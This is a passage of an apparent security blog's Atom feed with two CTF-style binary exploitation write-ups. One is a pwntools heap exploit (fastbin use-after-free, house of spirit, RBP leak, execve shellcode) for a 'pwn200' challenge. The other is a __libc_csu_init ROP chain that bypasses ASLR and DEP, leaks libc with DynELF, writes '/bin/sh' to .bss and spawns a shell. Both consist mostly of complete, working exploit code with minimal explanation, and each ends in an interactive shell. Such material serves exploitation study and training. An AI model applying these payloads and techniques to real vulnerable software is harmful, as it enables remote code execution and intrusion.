    <content type="html"><![CDATA[<p>fastbin UAF + house of spirit</p><p>off by one leak the address of RBP</p><p>input money overwrite pointer that point to stack address</p><p>and make a fake thunk struct here</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">raw_file=ELF(&apos;pwn200&apos;)</div><div class="line">libc=ELF(&apos;libc.so.6&apos;)</div><div class="line">p=process(&apos;pwn200&apos;)</div><div class="line">p.recvuntil(&apos;who are u?\n&apos;)</div><div class="line">def makeshellcode():</div><div class="line">    shellcode=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73&quot;</div><div class="line">    shellcode+=&quot;\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</div><div class="line">    shellcode=shellcode.ljust(47,&apos;a&apos;)</div><div class="line">    shellcode+=&apos;m&apos;</div><div class="line">    return shellcode</div><div class="line">def leakrbp():</div><div class="line">    p.recvuntil(&apos;m&apos;)</div><div class="line">    result=p.recvuntil(&apos;, w&apos;)</div><div class="line">    rbp_addr=u64(result[:-3].ljust(0x8,&apos;\x00&apos;))</div><div class="line">    return rbp_addr</div><div class="line">shellcode=makeshellcode()</div><div class="line">p.send(shellcode)</div><div class="line">rbp_addr=leakrbp()</div><div class="line">print &quot;rbp_addr is &quot;,hex(rbp_addr)</div><div class="line">target_addr=rbp_addr-0x90</div><div class="line">shellcode_addr=rbp_addr-0x50</div><div class="line">p.recvuntil(&apos;id ~~?&apos;)</div><div class="line">p.send(&apos;32&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;money~&apos;)</div><div class="line">payload=p64(0)*4+p64(0)+p64(0x41)</div><div class="line">payload=payload.ljust(0x38,&apos;\x00&apos;)+p64(target_addr)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;2&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;1&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;long?&apos;)</div><div class="line">p.send(&apos;48\n&apos;)</div><div class="line">p.recvuntil(&apos;48\n&apos;)</div><div class="line">data=&apos;a&apos;*0x18+p64(shellcode_addr)</div><div class="line">data=data.ljust(48,&apos;\x00&apos;)</div><div class="line">p.send(data)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;3\n&apos;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;fastbin UAF + house of spirit&lt;/p&gt;
&lt;p&gt;off by one leak the address of RBP&lt;/p&gt;
&lt;p&gt;input money overwrite pointer that point to stack address&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux x64 common ropgadget</title>
    <link href="http://www.math1as.com/2016/05/07/linux-x64-common-ropgadget/"/>
    <id>http://www.math1as.com/2016/05/07/linux-x64-common-ropgadget/</id>
    <published>2016-05-07T17:52:49.000Z</published>
    <updated>2018-02-07T17:59:36.478Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo -s echo 1 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure><p>enable aslr+DEP</p><p>find a common ropgadget to bypass them</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d ./depaslr |grep __libc_csu_init</div></pre></td></tr></table></figure><p>and view the disassembly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005a0:   41 57                   push   r15</div><div class="line">  4005a2:   41 89 ff                mov    r15d,edi</div><div class="line">  4005a5:   41 56                   push   r14</div><div class="line">  4005a7:   49 89 f6                mov    r14,rsi</div><div class="line">  4005aa:   41 55                   push   r13</div><div class="line">  4005ac:   49 89 d5                mov    r13,rdx</div><div class="line">  4005af:   41 54                   push   r12</div><div class="line">  4005b1:   4c 8d 25 c8 01 20 00    lea    r12,[rip+0x2001c8]        # 600780 &lt;__frame_dummy_init_array_entry&gt;</div><div class="line">  4005b8:   55                      push   rbp</div><div class="line">  4005b9:   48 8d 2d c8 01 20 00    lea    rbp,[rip+0x2001c8]        # 600788 &lt;__init_array_end&gt;</div><div class="line">  4005c0:   53                      push   rbx</div><div class="line">  4005c1:   4c 29 e5                sub    rbp,r12</div><div class="line">  4005c4:   31 db                   xor    ebx,ebx</div><div class="line">  4005c6:   48 c1 fd 03             sar    rbp,0x3</div><div class="line">  4005ca:   48 83 ec 08             sub    rsp,0x8</div><div class="line">  4005ce:   e8 0d fe ff ff          call   4003e0 &lt;_init&gt;</div><div class="line">  4005d3:   48 85 ed                test   rbp,rbp</div><div class="line">  4005d6:   74 1e                   je     4005f6 &lt;__libc_csu_init+0x56&gt;</div><div class="line">  4005d8:   0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]</div><div class="line">  4005df:   00 </div><div class="line">  4005e0:   4c 89 ea                mov    rdx,r13</div><div class="line">  4005e3:   4c 89 f6                mov    rsi,r14</div><div class="line">  4005e6:   44 89 ff                mov    edi,r15d</div><div class="line">  4005e9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</div><div class="line">  4005ed:   48 83 c3 01             add    rbx,0x1  //rbx=0+1=1</div><div class="line">  4005f1:   48 39 eb                cmp    rbx,rbp  //rbp=1</div><div class="line">  4005f4:   75 ea                   jne    4005e0 &lt;__libc_csu_init+0x40&gt; //不能让跳转</div><div class="line">  4005f6:   48 83 c4 08             add    rsp,0x8 //这里rsp自增了8,因此栈扩张了</div><div class="line">  4005fa:   5b                      pop    rbx</div><div class="line">  4005fb:   5d                      pop    rbp</div><div class="line">  4005fc:   41 5c                   pop    r12</div><div class="line">  4005fe:   41 5d                   pop    r13</div><div class="line">  400600:   41 5e                   pop    r14</div><div class="line">  400602:   41 5f                   pop    r15</div><div class="line">  400604:   c3                      ret    </div><div class="line">  400605:   66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]</div><div class="line">  40060c:   00 00 00 00</div></pre></td></tr></table></figure><p>the key point is there</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">4005e0: 41 ff 14 dc           call   QWORD PTR [r12+rbx*8]</div><div class="line">4005fa: 5b                    pop    rbx</div></pre></td></tr></table></figure><p>control r12 , control the RIP , control the RIP , control the world~</p><p>the calling convention under x64:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">param1     param2   param3</div><div class="line">rdi(edi)   rsi      rdx</div></pre></td></tr></table></figure><p>we know</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdx=r13 rsi=r14 edi=r15</div></pre></td></tr></table></figure><p>so that</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r15=param1 r14=param2 r13=param3</div></pre></td></tr></table></figure><p>the common ropgadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload=bufferlength|4005fa|0|1|got_write|8|leak address|1|4005a0|buffer56|main_addr</div></pre></td></tr></table></figure><p>full exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line">rawfile=ELF(&apos;depaslr&apos;)</div><div class="line">#target=process(&apos;./depaslr&apos;)</div><div class="line">target=remote(&apos;127.0.0.1&apos;,6666)</div><div class="line">got_write=rawfile.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot; + hex(got_write)</div><div class="line">got_read =rawfile.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line">bss_addr=0x00000000006009b8</div><div class="line">main_addr=0x400450</div><div class="line">def leak(address):</div><div class="line">    payload=&apos;A&apos;*72</div><div class="line">    payload+=p64(0x4005fa)</div><div class="line">    payload+=p64(0)</div><div class="line">    payload+=p64(1)</div><div class="line">    payload+=p64(got_write)</div><div class="line">    payload+=p64(8)</div><div class="line">    payload+=p64(address)</div><div class="line">    payload+=p64(1)</div><div class="line">    payload+=p64(0x4005e0)</div><div class="line">    payload+=&apos;A&apos;*56</div><div class="line">    payload+=p64(main_addr)</div><div class="line">    target.send(payload)</div><div class="line">    data = target.recv(8)</div><div class="line">    return data</div><div class="line">d = DynELF(leak, elf=rawfile)</div><div class="line">system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)</div><div class="line">print &quot;find systemaddr at &quot;+ (hex(system_addr))</div><div class="line">print &quot;write /bin/sh at bss section&quot;</div><div class="line">#write /bin/sh at bss section</div><div class="line">payload=&apos;A&apos;*72</div><div class="line">payload+=p64(0x4005fa)</div><div class="line">payload+=p64(0)</div><div class="line">payload+=p64(1)</div><div class="line">payload+=p64(got_read)</div><div class="line">payload+=p64(16)</div><div class="line">payload+=p64(bss_addr)</div><div class="line">payload+=p64(0)#input stream</div><div class="line">payload+=p64(0x4005e0)</div><div class="line">payload+=&apos;A&apos;*56</div><div class="line">payload+=p64(main_addr)</div><div class="line">target.send(payload)</div><div class="line">sleep(1)</div><div class="line">target.send(p64(system_addr))</div><div class="line">target.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line">#system</div><div class="line">payload=&apos;A&apos;*72</div><div class="line">payload+=p64(0x4005fa)</div><div class="line">payload+=p64(0)</div><div class="line">payload+=p64(1)</div><div class="line">payload+=p64(bss_addr)</div><div class="line">payload+=p64(0)</div><div class="line">payload+=p64(0)</div><div class="line">payload+=p64(bss_addr+8)</div><div class="line">payload+=p64(0x4005e0)</div><div class="line">payload+=&apos;A&apos;*56</div><div class="line">payload+=p64(main_addr)</div><div class="line">target.send(payload)</div><div class="line">target.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
      
    
    </summary>
    
    
  </entry>
  
</feed>
